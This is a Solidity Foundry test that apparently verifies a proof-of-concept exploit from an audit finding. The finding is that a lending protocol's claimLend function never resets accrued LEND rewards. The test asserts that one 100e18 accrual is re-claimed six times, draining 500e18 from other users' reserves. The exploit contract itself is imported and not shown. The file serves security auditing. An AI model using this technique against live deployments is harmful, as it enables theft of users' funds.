// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit} from "./58370-lend-repeated-claims-of-the-same-rewards-drain-lend-reserves.sol";

// Lend H-1 (finding 58370): CoreRouter.claimLend grants the accrued LEND reward
// but ignores grantLendInternal's return and never resets lendStorage.lendAccrued,
// so the same reward is re-claimable every call. Accrue 100e18 once, claim 6x -> 600e18.
contract Finding58370Test is Test {
    function test_exploit_repeatedClaims_drainLendReserves() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("legitimate accrued", e.legitimateAccrued());
        emit log_named_uint("total received", e.totalReceived());
        emit log_named_uint("profit (stolen)", e.profit());
        emit log_named_uint("reserve drained", e.reserveDrained());

        assertEq(e.legitimateAccrued(), 100e18, "attacker legitimately accrued only 100e18");
        assertEq(e.totalReceived(), 600e18, "attacker re-claimed the same reward 6x");
        assertEq(e.profit(), 500e18, "500e18 drained from other users' reserves");
        assertGt(e.profit(), 0, "reserve was drained");
    }
}
